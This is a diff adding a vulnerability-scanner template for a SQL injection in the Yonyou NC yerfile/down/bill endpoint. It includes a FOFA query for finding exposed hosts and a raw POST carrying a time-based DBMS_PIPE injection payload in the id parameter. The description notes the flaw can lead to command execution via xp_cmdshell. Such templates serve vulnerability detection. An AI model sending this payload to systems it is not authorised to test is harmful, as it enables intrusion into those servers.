@@ -1,0 +1,36 @@
+id: yonyou-nc-yerfile-down-bill-sqli
+
+info:
+  name: Yonyou NC yerfile/down/bill - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    用友NC //portal/pt/yerfile/down/bill接口的id参数存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://mp.weixin.qq.com/s/Vi80lHJ1u4R-XTpdUH-riA
+  metadata:
+    fofa-query: icon_hash="1085941792" && body="/logo/images/logo.gif"
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - raw:
+    - |
+      @timeout: 10s
+      POST /portal/pt/yerfile/down/bill?pageId=login HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+      Accept: */*
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate, br
+      Content-Type: application/x-www-form-urlencoded
+      Connection: close
+
+      id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5' 
+          - status_code == 500
+          - contains(body, "/lfw/frame/device_pc")
+        condition: and
